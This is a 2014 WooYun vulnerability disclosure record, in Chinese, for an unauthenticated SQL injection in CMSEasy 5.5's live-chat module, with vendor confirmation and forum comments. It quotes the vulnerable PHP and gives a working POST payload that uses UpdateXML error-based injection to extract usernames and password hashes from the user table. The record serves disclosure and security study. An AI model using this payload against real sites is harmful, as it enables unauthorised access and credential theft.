{"id": 48732, "wybug_id": "wooyun-2014-076629", "wybug_title": "cmseasy前台无需登录直接获取敏感数据的SQL注入（有POC证明）", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-09-19 17:03", "wybug_open_date": "2014-12-18 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向公众公开  简要描述： cmseasy  前台无视gpc的sql注入 详细说明：  我下载的是最新版本的cmseasy，之前有人提过这里的漏洞，官方进行了修补，但是越修补，越捉急，直接看代码：这里是注册函数的地方celive.class.php(480-497):\nfunction xajax_live() {        if (!$this->xajax_live_flag) {            $this->xajax_live_flag=true;            include_once(dirname(__FILE__).'/xajax.inc.php');            include_once(dirname(__FILE__).'/xajax.class.php');            global $xajax_live;            $xajax_live=new xajax();            $xajax_live->setCharEncoding('utf-8');            $xajax_live->decodeUTF8InputOn();            $xajax_live->registerFunction('Request');            $xajax_live->registerFunction('Postdata');            $xajax_live->registerFunction('ChatHistory');            $xajax_live->registerFunction('LiveMessage');            $xajax_live->registerFunction('EndChat');            $xajax_live->registerFunction('GetAdminEndChat');            $xajax_live->processRequests();        }    }\n这里就是最后我们执行的注册函数xajx.inc.php:(175-195):\nfunction LiveMessage($a) {    global $db;    $sessionid = $_SESSION['sessionid'];    $name = htmlspecialchars($a['name']);    $email = htmlspecialchars($a['email']);    $country = htmlspecialchars($a['country']);    $phone = htmlspecialchars($a['phone']);    $departmentid = htmlspecialchars($a['departmentid']);    $message = htmlspecialchars($a['message']);    $timestamp = time();    $ip = $_SERVER['REMOTE_ADDR'];    $sql = \"INSERT INTO `chat` (`sessionid`,`name`,`email`,`phone`,`departmentid`,`message`,`timestamp`,`ip`,`status`) VALUES('\" . $sessionid . \"','\" . $name . \"','\" . $email . \"','\" . $phone . \"','\" . $departmentid . \"','\" . $message . \"','\" . $timestamp . \"','\" . $ip . \"','2')\";    $db->query($sql);    $sql = \"DELETE FROM `sessions` WHERE `id`='\" . $sessionid . \"'\";    $db->query($sql);    $text = \"<?php echo $lang[shout_success]?>\\n\";    $objResponse = new xajaxResponse('utf-8');    $objResponse->addAssign('content', 'innerHTML', $text);    $objResponse->redirect('../', 5);    return $objResponse;}\n搞清楚了这个我们看一下 参数怎么流入进来的：xajax.class.php(306-324):\n//这里如果gpc开启，那么还原字符串for ($i = 0;$i <sizeof($aArgs);$i++){if (get_magic_quotes_gpc() == 1 &&is_string($aArgs[$i])) {$aArgs[$i] = stripslashes($aArgs[$i]);}if (stristr($aArgs[$i],\"<xjxobj>\") != false){$aArgs[$i] = $this->_xmlToArray(\"xjxobj\",$aArgs[$i]);}else if (stristr($aArgs[$i],\"<xjxquery>\") != false){$aArgs[$i] = $this->_xmlToArray(\"xjxquery\",$aArgs[$i]);}else if ($this->bDecodeUTF8Input){$aArgs[$i] = $this->_decodeUTF8Data($aArgs[$i]);}}\n看见没有，如果这里开启的gpc，那么这里就直接stripslashes，坐着肯定是为了后面解析xml，才做了这个考虑问题就在这里，我们构造发送数据为：url:http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818_new/uploads/celive/live/header.phppostdata：xajax=LiveMessage&xajaxargs[0]=<xjxobj><q><e><k>name</k><v>',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--%20</v></e></q></xjxobj>然后访问一下，直接密码用户名了:\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-20 07:49 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-19 17:10 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  常被蹂躏的五大cms之cmseasy    \n     2014-09-19 17:14 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  恩 我就知道    \n     2014-09-19 19:48 |    \t\tYouYaX(乌云厂商)\t\t \n  @phith0n 另外四个是？    \n     2014-09-19 21:16 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @YouYaX youyax、    \n     2014-09-19 21:19 |    \t\tYouYaX(乌云厂商)\t\t \n  @′  雨。 我很久没来了，鉴于开源代码暴露的种种弊端及潜在危险，我已经不开源了，`(*∩_∩*)′    \n     2014-09-19 21:31 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @YouYaX 开源才能更好的修复漏洞嘛。 总有好白帽给你提出来的啦。    \n     2014-09-23 11:08 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  感觉问题肯定又是在LiveMessage那反复出    \n     2014-12-18 20:46 |    \t\t萌萌哒-花粉 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | 多乌云 多美女 花粉 顾名思义 就是校花班花...)\t\t \n  密码怎么解密那    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}